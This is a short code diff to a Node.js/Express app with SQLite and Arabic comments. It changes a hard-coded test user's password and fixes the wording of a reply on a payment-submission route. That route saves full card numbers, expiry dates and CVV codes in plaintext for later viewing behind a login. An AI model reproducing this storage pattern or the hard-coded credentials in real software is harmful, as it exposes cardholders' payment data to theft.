@@ -20,7 +20,7 @@ db.serialize(() => {
     db.run("CREATE TABLE users (user_id TEXT, password TEXT)");
     // إضافة مستخدم اختباري
     const stmt = db.prepare("INSERT INTO users VALUES (?, ?)");
-    stmt.run("hema", "aa.1122334455.aa");  // استبدل user_id و password بالقيم الجديدة
+    stmt.run("hema", "a342234");  // استبدل user_id و password بالقيم الجديدة
     stmt.finalize();
 });
 
@@ -37,7 +37,7 @@ app.post('/submit', (req, res) => {
     const stmt = db.prepare("INSERT INTO payments VALUES (?, ?, ?, ?, ?, ?, ?)");
     stmt.run(name, card_number, expiry_date, cvv, country, amount, currency);
     stmt.finalize();
-    res.send('قيد المرجعه الطلب ');
+    res.send('قيد المراجعة الطلب');
 });
 
 // عرض البيانات بعد التحقق من المستخدم وكلمة المرور
